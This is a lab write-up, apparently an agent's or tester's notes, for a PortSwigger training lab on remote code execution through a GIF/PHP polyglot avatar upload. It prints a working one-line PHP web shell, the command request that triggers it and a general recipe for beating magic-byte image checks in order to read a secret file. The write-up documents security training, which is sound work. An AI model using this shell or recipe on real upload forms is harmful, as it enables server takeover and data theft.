# PortSwigger Lab

## Lab

Remote code execution via polyglot web shell upload

URL: https://0aa600a1049af8908082495400c90076.web-security-academy.net

## Vulnerability Class

File upload — content-inspection bypass via GIF/PHP polyglot (magic bytes + code) → PHP RCE

## Objective

Read `/home/carlos/secret` and submit via `POST /submitSolution` (established by evidence: same contract as sibling labs; `{"correct":true}` + `is-solved`). Official description not read.

## Initial Observations

- Blog; login `wiener:peter` → 302; avatar form (multipart + per-form csrf).
- Plain `.php` (as `image/png`) → 403 `Error: file is not a valid image` — CONTENT inspection confirmed (message oracle names validity, not type/extension).

## Hypotheses

- H1: Validator checks magic bytes / image parse — a GIF-headered payload passes.
- H2: Stored polyglot (`.php` extension kept) executes under the served path with PHP prologue output.
- H3: Secret exfiltration (minus prologue bytes) + submit → solved.

## Attempts

1. Per-form csrf fixed; plain shell → 403 validity error (content gate mapped, not extension/MIME).
2. Minimal polyglot `GIF89a` + `<?php echo shell_exec($_GET["cmd"]); ?>` as `.php`/`image/gif` → 200 stored. H1 confirmed — magic-byte check only.
3. `GET /files/avatars/poly.gif.php?cmd=id` → `GIF89a` + `uid=12002(carlos)…` — H2 confirmed (prologue bytes render verbatim, code executes).
4. First secret submission FAILED (`{"correct":false}`) — included the 6-byte `GIF89a` prologue in the answer (my parsing error, not app behavior).
5. Stripped prologue (`tail`/prefix-strip → 32-char secret) → submit → `{"correct":true}` → `is-solved`/`Solved`. WORKED.

## What Failed

- Plain (non-image) shell — correctly rejected by content check; defines the polyglot requirement.
- Unstripped exfiltration — response framing bytes contaminate secrets; strip known prologue before submitting.

## What Worked

- GIF89a+PHP polyglot → RCE → prologue-stripped secret → submit → solved.

## Burp Observations

- Not used via Burp MCP; printf-crafted polyglot + curl sufficed.

## Browser Observations

- Not required. No JS-dependent behavior.

## CLI / Tool Observations

- `printf` with hex escapes for magic bytes; `xxd` to verify framing; prefix-strip (not blind `tail -c`) for exact secret extraction; per-form csrf.

## Root Cause

Image validation inspects leading magic bytes only: `GIF89a`-prefixed PHP passes as “valid image”, stores with `.php` extension under the executable served path, and runs — non-PHP prologue bytes emit verbatim while the code executes as the app user.

## Verification

- Content-gate proof: plain PHP → 403 validity error vs polyglot → 200 stored (magic bytes the sole variable).
- Execution proof: `uid=…` output alongside verbatim prologue.
- Secret proof: 32-char stripped value → `{"correct":true}` (unstripped → `false`, bracketing the exact secret) + `is-solved`. Deterministic.

## Impact

Full RCE as app user via content-check bypass (demonstrated secret theft); polyglots defeat magic-byte-only validation generally.

## Why The Successful Approach Worked

- Read the 403 as CONTENT gate (not extension/MIME) → minimal polyglot first, no wasted extension matrix.
- Treated the false submission as parsing bug (verified via `xxd` framing) rather than doubting the RCE.
- Sibling-lab path/submission reuse as hypothesis, confirmed by output + oracle here.

## Generalization

- On “not a valid image” gates: prepend format magic (`GIF89a`, `\x89PNG`, `FFD8`) to the payload, keep executable extension, verify stored → execute → frame-strip exfiltrated secrets (`xxd` first, strip prologue, submit exact bytes).
- `{"correct":false}` after RCE = framing contamination until proven otherwise — compare raw vs stripped.
- Cheapest polyglot (magic + code, no valid image structure) first; full valid-image polyglots only if magic fails.

## Lessons Learned

- First polyglot lab: content-inspection bypass replaces header/extension tricks when the message names validity.
- Response framing is part of the exfiltration protocol — account for prologue/epilogue bytes in every secret read.
- False-submission forensics (`xxd`) beats re-running the whole chain.

## Related Methodology

- methodology/file-security.md (polyglot content bypass — to be extended)

## References

- Solved instance: https://0aa600a1049af8908082495400c90076.web-security-academy.net/
- Deliberately did NOT read the official solution/writeup for this lab.
